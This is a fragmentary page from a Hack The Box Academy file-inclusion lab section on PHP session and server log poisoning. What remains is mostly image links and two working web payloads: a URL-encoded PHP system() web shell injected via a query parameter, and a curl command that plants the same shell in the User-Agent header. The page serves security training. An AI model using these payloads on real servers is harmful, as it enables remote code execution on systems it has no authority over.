<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/252
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 252
// Section Title: Log Poisoning
// Page Title: Hack The Box - Academy
// Page Number: 8
-->

# Log Poisoning

**Module Name:** File Inclusion **Page Number:** 8

#### 

#### FILE INCLUSION

# Log Poisoning

## PHP Session Poisoning

![https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

![https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

``` url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

![https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

``` url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

![https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

## Server Log Poisoning

![https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

![https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

![https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

``` shell-session
ndefstathiou@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

![https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

# 

# 

#### Questions

####